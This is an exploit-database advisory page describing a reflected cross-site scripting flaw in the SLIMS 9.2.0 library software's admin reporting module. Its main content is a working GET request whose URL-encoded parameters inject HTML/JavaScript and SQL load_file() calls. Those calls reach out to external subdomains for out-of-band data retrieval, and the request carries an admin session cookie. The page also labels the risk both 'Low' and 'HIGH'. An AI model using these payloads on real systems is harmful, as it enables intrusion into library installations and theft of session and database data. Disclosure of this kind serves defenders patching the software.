---
title: Senayan Library Management System 9.2.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022120042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-22
fetch_date: 2025-10-04T02:11:49.871804
---

# Senayan Library Management System 9.2.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.2.0 Cross Site Scripting** **2022.12.21**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

## Title: Senayan Library Management System v9.2.0 a.k.a SLIMS 9 XSS-Reflected - inserting gif - redirect to outside HTTPS server
## Author: nu11secur1ty
## Date: 12.19.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases/tag/v9.2.0
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.0
## Description:
The value of manual insertion `point 3` is copied into the HTML
document as plain text between tags.
The payload t8xqv<script>alert(1)</script>uou2q was submitted in the
manual insertion `point 3`.
This input was echoed unmodified in the application's response.
The attacker can trick the already authenticated users to visit an
very dangerous web page ot malicious javascript exploit.
## STATUS: HIGH Vulnerability
[+] Payloads:
```GET
GET /slims9\_bulian-9.2.0/admin/modules/reporting/customs/loan\_by\_class.php?reportView=true&year=2002&class=%62%62%62%62%27%2b%28%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%27%5c%5c%5c%5c%37%31%36%67%62%31%63%66%65%39%67%6b%6a%61%34%7a%64%6a%34%35%71%78%78%39%32%30%38%76%77%6c%6b%63%6e%30%65%6e%36%62%76%2e%73%6c%69%6d%73%2e%77%65%62%2e%69%64%5c%5c%6e%62%71%27%29%29%2b%27%74%38%78%71%76%3c%64%69%76%3e%3c%69%6d%61%67%65%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%67%69%70%68%79%2e%63%6f%6d%2f%6d%65%64%69%61%2f%62%54%42%79%75%74%61%6d%4a%53%6a%68%53%2f%67%69%70%68%79%2e%67%69%66%20%6f%6e%6c%6f%61%64%73%74%61%72%74%3d%61%6c%65%72%74%28%31%33%33%37%29%3e%68%65%6c%6c%6f%20%66%72%6f%6d%20%6e%75%31%31%73%65%63%75%72%31%74%79%3c%2f%64%69%76%3e%3c%2f%73%63%72%69%70%74%3e%75%6f%75%32%0a&membershipType=a%27%27&collType=aaaa%27%2b(select%20load\_file(%27%5c%5c%5c%5cdctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id%5c%5cwtf%27))%2b%27
HTTP/1.1
Host: pwnedhost.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107
Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SenayanAdmin=i6ml8c8i4dmi37vtcpnnf9jhm9; admin\_logged\_in=1
Connection: close
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.0)
## Proof and Exploit:
[href](https://streamable.com/5smxxm)
## Time spent
`02:35:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120042)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top